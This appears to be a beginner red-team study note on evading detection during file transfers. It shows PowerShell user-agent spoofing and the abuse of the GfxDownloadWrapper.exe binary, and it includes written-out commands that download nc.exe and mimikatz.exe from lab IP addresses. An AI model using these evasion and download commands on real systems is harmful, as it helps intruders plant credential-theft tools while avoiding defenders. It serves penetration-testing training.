---
tags: [module/file-transfers, evasion, user-agent, lolbas, gtfobins, red-team, level/beginner]
---

# Evading Detection - Beginner's Guide

## Why Evade Detection?

Defenders are watching. They look for:
- Unusual user agents
- PowerShell downloading files
- Certutil from strange locations
- BITS transfers to unknown IPs

**The Rule:** If you look like normal traffic, you won't get caught.

---

## Two Main Evasion Techniques

| Technique | Description |
|-----------|-------------|
| Change User Agent | Make your traffic look like a browser |
| Use LOLBins | Use trusted system binaries instead of your own tools |

---

## Technique 1: Changing User Agents

PowerShell's `Invoke-WebRequest` has a `-UserAgent` parameter that lets you change the default user agent.

### Built-in User Agents in PowerShell

PowerShell has pre-defined user agents for common browsers:

[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Output:

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16

---

## Using a Chrome User Agent

### Step 1: Set the User Agent

$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome

### Step 2: Download with that User Agent

Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"

### What the Defender Sees

On your listening server:
nc -lvnp 80

Output:
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive

**This looks like Chrome, not PowerShell.**

---

## Technique 2: Using LOLBins

LOLBins (Living Off the Land Binaries) are legitimate system binaries that can be abused for malicious purposes.

### Why Use LOLBins?

- They're already on the system
- They're trusted by security software
- They bypass application whitelisting
- They may not be monitored

### Example: GfxDownloadWrapper.exe

Some Windows 10 systems have an Intel Graphics Driver that includes `GfxDownloadWrapper.exe`. This binary can download files.

GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"

**This looks like a legitimate driver update, not an attack.**

---

## Finding LOLBins

### Windows: LOLBAS Project

https://lolbas-project.github.io/

Search for:
- download
- upload
- execute
- filewrite

### Linux: GTFOBins Project

https://gtfobins.github.io/

Search for:
- file download
- file upload
- command execution

---

## Why These Techniques Work

| Defense | How LOLBins Bypass It |
|---------|----------------------|
| Application Whitelisting | LOLBins are trusted and allowed |
| User Agent Monitoring | Looks like Chrome, not PowerShell |
| Command-line Logging | May not alert on legitimate binaries |
| Behavioral Analysis | Looks like normal system activity |

---

## Key Takeaways

- Change your user agent to look like a browser
- PowerShell has built-in browser user agents
- Chrome user agent makes PowerShell traffic look legit
- LOLBins are trusted system binaries
- LOLBAS project catalogs Windows LOLBins
- GTFOBins project catalogs Linux LOLBins
- GfxDownloadWrapper.exe can download files
- Application whitelisting doesn't block trusted binaries
- Evasion is about looking normal
- Practice these techniques in the lab
- The quieter you are, the longer you'll stay undetected
